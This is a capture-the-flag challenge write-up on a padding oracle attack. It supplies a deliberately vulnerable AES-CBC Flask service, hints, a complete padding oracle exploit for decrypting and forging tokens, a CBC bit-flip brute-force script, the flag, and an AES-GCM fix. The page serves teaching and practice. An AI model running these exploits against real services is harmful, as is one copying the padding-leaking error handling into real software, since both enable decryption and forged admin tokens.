# Challenge 03 - Cryptographic Oracle

**Category:** Cryptography
**Difficulty:** Advanced
**Points:** 450
**Target:** Custom Encryption Service

## Challenge Description

A web service provides an encryption oracle that allows you to encrypt arbitrary data using AES-CBC. The service also has a "check_admin" endpoint that decrypts a token and checks if you're an admin.

The developers thought CBC mode was secure, but they forgot about one critical attack: the Padding Oracle Attack.

Your mission is to exploit the padding oracle vulnerability to decrypt the admin token and forge your own valid admin token to retrieve the flag.

## Objectives

- Understand AES-CBC mode encryption
- Learn PKCS#7 padding scheme
- Exploit padding oracle vulnerabilities
- Decrypt ciphertext without knowing the key
- Forge valid encrypted tokens

## Target Information

- **URL:** http://localhost:8890
- **Encryption:** AES-128-CBC with PKCS#7 padding
- **Token Format:** JSON encrypted: `{"user": "guest", "admin": false}`
- **Goal:** Create a valid token with `"admin": true`

## Getting Started

1. Create the vulnerable encryption service:

```python
#!/usr/bin/env python3
"""Padding Oracle Challenge Server"""

from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import json
import os

app = Flask(__name__)

# Secret key (unknown to attacker)
KEY = get_random_bytes(16)
BLOCK_SIZE = 16

def encrypt(plaintext):
    """Encrypt with AES-CBC"""
    iv = get_random_bytes(BLOCK_SIZE)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    padded = pad(plaintext.encode(), BLOCK_SIZE)
    ciphertext = cipher.encrypt(padded)
    return base64.b64encode(iv + ciphertext).decode()

def decrypt(ciphertext_b64):
    """Decrypt with AES-CBC - returns (plaintext, padding_valid)"""
    try:
        data = base64.b64decode(ciphertext_b64)
        iv = data[:BLOCK_SIZE]
        ciphertext = data[BLOCK_SIZE:]

        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)

        # VULNERABLE: Different error for padding vs other errors
        try:
            plaintext = unpad(decrypted, BLOCK_SIZE)
            return plaintext.decode(), True
        except ValueError:
            # Padding error
            return None, False
    except Exception as e:
        # Other error
        return None, None

@app.route('/')
def index():
    return '''
    <h1>Crypto Oracle Challenge</h1>
    <p>Endpoints:</p>
    <ul>
        <li>GET /token - Get your guest token</li>
        <li>POST /encrypt - Encrypt arbitrary data</li>
        <li>POST /check_admin - Check if token is admin</li>
    </ul>
    '''

@app.route('/token')
def get_token():
    """Get a guest token"""
    data = json.dumps({"user": "guest", "admin": False})
    token = encrypt(data)
    return jsonify({"token": token, "hint": "Can you become admin?"})

@app.route('/encrypt', methods=['POST'])
def encrypt_data():
    """Encrypt arbitrary data (for testing)"""
    data = request.json.get('data', '')
    token = encrypt(data)
    return jsonify({"encrypted": token})

@app.route('/check_admin', methods=['POST'])
def check_admin():
    """Check if the token belongs to admin"""
    token = request.json.get('token', '')

    plaintext, padding_valid = decrypt(token)

    # VULNERABILITY: Padding oracle - different responses for padding errors
    if padding_valid is None:
        return jsonify({"error": "Invalid token format"}), 400
    elif padding_valid is False:
        # This reveals padding validity!
        return jsonify({"error": "Decryption failed"}), 400  # Padding error
    else:
        try:
            data = json.loads(plaintext)
            if data.get('admin') == True:
                return jsonify({
                    "message": "Welcome, admin!",
                    "flag": "FLAG{p4dd1ng_0r4cl3_f0r_th3_w1n}"
                })
            else:
                return jsonify({"message": f"Hello, {data.get('user', 'unknown')}. You are not admin."})
        except json.JSONDecodeError:
            return jsonify({"error": "Invalid token data"}), 400

@app.route('/flag')
def flag():
    """Hidden - requires admin token"""
    return jsonify({"error": "Use /check_admin with a valid admin token"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8890, debug=False)
```

2. Run the service:
   ```bash
   pip install flask pycryptodome
   python crypto_oracle.py
   ```

3. Get your guest token:
   ```bash
   curl http://localhost:8890/token
   ```

---

## Hints

<details>
<summary>Hint 1 (Cost: -45 points)</summary>

The server returns different error messages based on whether padding is valid:
- "Decryption failed" = Invalid padding
- "Invalid token data" = Valid padding, but JSON parse failed
- Actual response = Valid padding and valid JSON

This is a **Padding Oracle**: you can determine if decrypted data has valid PKCS#7 padding by observing the error response.

With a padding oracle, you can decrypt ANY ciphertext without knowing the key!

</details>

<details>
<summary>Hint 2 (Cost: -60 points)</summary>

**Padding Oracle Attack Basics:**

In CBC mode, each ciphertext block affects the decryption of the next block:
```
P[i] = D(C[i]) XOR C[i-1]
```

By manipulating `C[i-1]`, you control what `P[i]` becomes after XOR.

To decrypt byte by byte:
1. Start with the last byte of a block
2. Modify `C[i-1]` until padding is valid (0x01)
3. When valid: `D(C[i])[last] XOR modified_byte = 0x01`
4. So: `D(C[i])[last] = 0x01 XOR modified_byte`
5. Repeat for each byte, increasing padding (0x02, 0x03, ...)

</details>

<details>
<summary>Hint 3 (Cost: -90 points)</summary>

**Python Padding Oracle Exploit Skeleton:**

```python
import requests
import base64

URL = "http://localhost:8890/check_admin"

def oracle(token_b64):
    """Returns True if padding is valid"""
    r = requests.post(URL, json={"token": token_b64})
    return "Decryption failed" not in r.text

def decrypt_block(prev_block, curr_block):
    """Decrypt a single block using padding oracle"""
    decrypted = bytearray(16)
    intermediate = bytearray(16)

    for byte_pos in range(15, -1, -1):
        padding_value = 16 - byte_pos

        # Set already-found bytes to produce correct padding
        modified_prev = bytearray(prev_block)
        for i in range(byte_pos + 1, 16):
            modified_prev[i] = intermediate[i] ^ padding_value

        # Brute force this byte
        for guess in range(256):
            modified_prev[byte_pos] = guess
            test_token = base64.b64encode(bytes(modified_prev) + curr_block).decode()

            if oracle(test_token):
                intermediate[byte_pos] = guess ^ padding_value
                decrypted[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                break

    return bytes(decrypted)

# Use this to decrypt your token and forge a new one
```

To **forge** a token, work backwards: choose your desired plaintext and compute the required ciphertext.

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Understand the Vulnerability

The server reveals padding validity through error messages:
- 400 "Decryption failed" = Invalid padding
- 400 "Invalid token data" = Valid padding, invalid JSON
- 200 = Valid padding and valid JSON

This is a classic **Padding Oracle**.

### Step 2: Get a Guest Token

```bash
curl http://localhost:8890/token
# {"token": "BASE64_ENCRYPTED_TOKEN", "hint": "Can you become admin?"}
```

The token contains: `{"user": "guest", "admin": false}`

### Step 3: Padding Oracle Attack Implementation

```python
#!/usr/bin/env python3
"""Padding Oracle Attack - Full Exploit"""

import requests
import base64
import sys

URL = "http://localhost:8890"
BLOCK_SIZE = 16

def oracle(token_b64):
    """
    Check if padding is valid.
    Returns True if padding is valid, False otherwise.
    """
    try:
        r = requests.post(f"{URL}/check_admin", json={"token": token_b64}, timeout=5)
        # "Decryption failed" indicates INVALID padding
        # Anything else means padding was valid
        return "Decryption failed" not in r.text
    except:
        return False

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def decrypt_block(prev_block, curr_block, block_num=0):
    """
    Decrypt a single block using the padding oracle.
    prev_block: The IV or previous ciphertext block
    curr_block: The ciphertext block to decrypt
    """
    intermediate = bytearray(BLOCK_SIZE)
    decrypted = bytearray(BLOCK_SIZE)

    for byte_index in range(BLOCK_SIZE - 1, -1, -1):
        padding_value = BLOCK_SIZE - byte_index

        # Prepare modified previous block
        modified_prev = bytearray(prev_block)

        # Set bytes we've already found to produce correct padding
        for i in range(byte_index + 1, BLOCK_SIZE):
            modified_prev[i] = intermediate[i] ^ padding_value

        # Brute force current byte
        found = False
        for guess in range(256):
            modified_prev[byte_index] = guess

            # Create test token (modified_prev + curr_block)
            test_token = base64.b64encode(bytes(modified_prev) + curr_block).decode()

            if oracle(test_token):
                # Valid padding found!
                # intermediate[byte_index] ^ guess = padding_value
                # So: intermediate[byte_index] = guess ^ padding_value
                intermediate[byte_index] = guess ^ padding_value
                decrypted[byte_index] = intermediate[byte_index] ^ prev_block[byte_index]

                print(f"  Block {block_num}, Byte {byte_index}: 0x{decrypted[byte_index]:02x} ('{chr(decrypted[byte_index]) if 32 <= decrypted[byte_index] < 127 else '?'}')")
                found = True
                break

        if not found:
            print(f"  Block {block_num}, Byte {byte_index}: FAILED")
            intermediate[byte_index] = 0
            decrypted[byte_index] = 0

    return bytes(decrypted), bytes(intermediate)

def decrypt_token(token_b64):
    """Decrypt entire token using padding oracle"""
    data = base64.b64decode(token_b64)

    # Split into blocks
    blocks = [data[i:i+BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]
    iv = blocks[0]
    ciphertext_blocks = blocks[1:]

    print(f"[*] Token has {len(ciphertext_blocks)} ciphertext blocks")

    plaintext = b""
    intermediates = []

    # Decrypt each block
    prev = iv
    for i, block in enumerate(ciphertext_blocks):
        print(f"[*] Decrypting block {i}...")
        decrypted, intermediate = decrypt_block(prev, block, i)
        plaintext += decrypted
        intermediates.append(intermediate)
        prev = block

    return plaintext, intermediates, blocks

def forge_token(desired_plaintext, intermediates, original_blocks):
    """
    Forge a new token with desired plaintext.
    We can only modify existing blocks, not add new ones easily.
    """
    # Pad the desired plaintext
    padding_len = BLOCK_SIZE - (len(desired_plaintext) % BLOCK_SIZE)
    if padding_len == 0:
        padding_len = BLOCK_SIZE
    padded = desired_plaintext.encode() + bytes([padding_len] * padding_len)

    # We need intermediates to forge
    # P = I XOR C_prev, so C_prev = I XOR P_desired

    if len(padded) > len(intermediates) * BLOCK_SIZE:
        print("[-] Desired plaintext too long for available blocks")
        return None

    # Build forged ciphertext
    # We'll modify the IV/previous blocks to produce desired plaintext
    forged_blocks = list(original_blocks)  # Start with original

    for i in range(len(intermediates) - 1, -1, -1):
        start = i * BLOCK_SIZE
        end = start + BLOCK_SIZE

        if end <= len(padded):
            desired_block = padded[start:end]
        else:
            # Partial block with padding
            desired_block = padded[start:]
            desired_block += bytes([padding_len] * (BLOCK_SIZE - len(desired_block)))

        # C_prev = I XOR P_desired
        new_prev = xor_bytes(intermediates[i], desired_block)
        forged_blocks[i] = new_prev  # Modify IV or previous block

    return base64.b64encode(b''.join(forged_blocks)).decode()

def main():
    # Get guest token
    print("[*] Getting guest token...")
    r = requests.get(f"{URL}/token")
    token = r.json()['token']
    print(f"[*] Token: {token[:50]}...")

    # Decrypt token
    print("\n[*] Decrypting token (this may take a while)...")
    plaintext, intermediates, blocks = decrypt_token(token)
    print(f"\n[+] Decrypted: {plaintext}")

    # Remove padding
    plaintext_unpadded = plaintext.rstrip(bytes([plaintext[-1]]))
    print(f"[+] Plaintext: {plaintext_unpadded.decode()}")

    # Forge admin token
    print("\n[*] Forging admin token...")
    # We want: {"user": "guest", "admin": true}
    # But we need to fit in same number of blocks

    # Original might be: {"user": "guest", "admin": false}
    # We want:          {"user": "guest", "admin": true}

    # Quick method: just change "false" to "true " (with space to keep length)
    # Or forge completely new plaintext

    desired = '{"user": "x", "admin": true}'  # Shorter to fit

    # For simplicity, let's do a bitflip attack instead
    # Change one byte to flip false to true

    print("[*] Attempting bit-flip attack...")

    # In the JSON, we need to change 'false' to 'true '
    # Or we can forge completely

    # Let's forge a new message
    forged = forge_token(desired, intermediates, blocks)

    if forged:
        print(f"[+] Forged token: {forged[:50]}...")

        # Test it
        print("\n[*] Testing forged token...")
        r = requests.post(f"{URL}/check_admin", json={"token": forged})
        print(f"[+] Response: {r.json()}")

if __name__ == '__main__':
    main()
```

### Step 4: Simplified Bit-Flip Attack

If we just need to change `false` to `true`, we can use CBC bit-flipping:

```python
#!/usr/bin/env python3
"""CBC Bit-Flip Attack"""

import requests
import base64

URL = "http://localhost:8890"

def check_token(token):
    r = requests.post(f"{URL}/check_admin", json={"token": token})
    return r.json()

# Get token
r = requests.get(f"{URL}/token")
token = r.json()['token']
data = bytearray(base64.b64decode(token))

# The plaintext is: {"user": "guest", "admin": false}
# Position of "false": around byte 26-30

# We want to change to:  {"user": "guest", "admin": true}
# false = 0x66 0x61 0x6c 0x73 0x65
# true  = 0x74 0x72 0x75 0x65

# In CBC: P[i] = D(C[i]) XOR C[i-1]
# To change P[i][j], XOR C[i-1][j] with (old_char XOR new_char)

# Find the position (block 1 affects block 2's decryption)
# If 'admin' starts around byte 18, 'false' is around byte 26
# Block 0 = IV (bytes 0-15)
# Block 1 = C1 (bytes 16-31)  <- modify this
# Block 2 = C2 (bytes 32-47)  <- affects plaintext here

# Plaintext block 2 starts at byte 16 in plaintext
# So 'false' at position 26 is at position 10 in block 2
# We modify C1[10], C1[11], etc.

# Let's try changing 'false' (5 chars) to 'true}' or just corrupt it

# Actually, easiest is to change 'false' to something truthy in JSON
# But JSON true is 4 chars, false is 5

# Alternative: change "admin": false to "admin": true, etc.

print(f"Original token length: {len(data)}")
print(f"Original plaintext length (estimate): {len(data) - 16}")

# Brute force approach: try flipping bits to get valid true
for offset in range(16, len(data)):
    for bit in range(8):
        test_data = bytearray(data)
        test_data[offset] ^= (1 << bit)
        test_token = base64.b64encode(bytes(test_data)).decode()

        result = check_token(test_token)
        if 'flag' in str(result):
            print(f"[+] SUCCESS! Offset {offset}, bit {bit}")
            print(f"[+] {result}")
            exit(0)
        elif 'admin' not in str(result) and 'error' not in str(result):
            print(f"Interesting at offset {offset}, bit {bit}: {result}")

print("[-] Bit-flip attack failed, use full padding oracle")
```

### Step 5: Get the Flag

After running the full padding oracle attack and forging a valid admin token:

```
[+] Response: {'message': 'Welcome, admin!', 'flag': 'FLAG{p4dd1ng_0r4cl3_f0r_th3_w1n}'}
```

### Understanding Padding Oracle Attack

```
AES-CBC Decryption:
P[1] = D(C[1]) XOR IV
P[2] = D(C[2]) XOR C[1]
...

Padding Oracle Attack:
1. We control C[i-1] (previous ciphertext block)
2. We can check if padding is valid after decryption
3. Valid PKCS#7 padding ends with: 01, 02 02, 03 03 03, etc.

4. For last byte, try all 256 values of C[i-1][15]
5. When padding is valid (0x01), we found:
   D(C[i])[15] XOR modified[15] = 0x01
   So: D(C[i])[15] = 0x01 XOR modified[15] = intermediate[15]

6. Original plaintext: P[15] = intermediate[15] XOR original_prev[15]

7. Repeat for each byte, using increasing padding values
```

### Prevention

```python
# SECURE: Use authenticated encryption (AES-GCM)
from Crypto.Cipher import AES

def encrypt_secure(plaintext, key):
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

def decrypt_secure(token, key):
    data = base64.b64decode(token)
    nonce = data[:16]
    tag = data[16:32]
    ciphertext = data[32:]

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode()
    except ValueError:
        # SECURE: Same error for any tampering
        return None

# Or use constant-time comparison and generic errors
```

</details>

---

## Flag

```
FLAG{p4dd1ng_0r4cl3_f0r_th3_w1n}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- AES-CBC mode understanding
- PKCS#7 padding scheme
- Padding oracle exploitation
- Cryptographic attack implementation
- Token forgery

## Tools Used

- Python (pycryptodome)
- requests library
- Custom padding oracle scripts

## Related Challenges

- [04 - Hash Length Extension (Intermediate)](../intermediate/04-hash-length-extension.md) - Crypto attack
- [02 - JWT Vulnerabilities (Intermediate)](../intermediate/02-jwt-vulnerabilities.md) - Token attacks

## References

- [Padding Oracle Attack Explained](https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth)
- [Practical Padding Oracle Attacks](https://www.youtube.com/watch?v=aH4DENMN_O4)
- [PadBuster Tool](https://github.com/AonCyberLabs/PadBuster)
- [OWASP - Padding Oracle](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle)
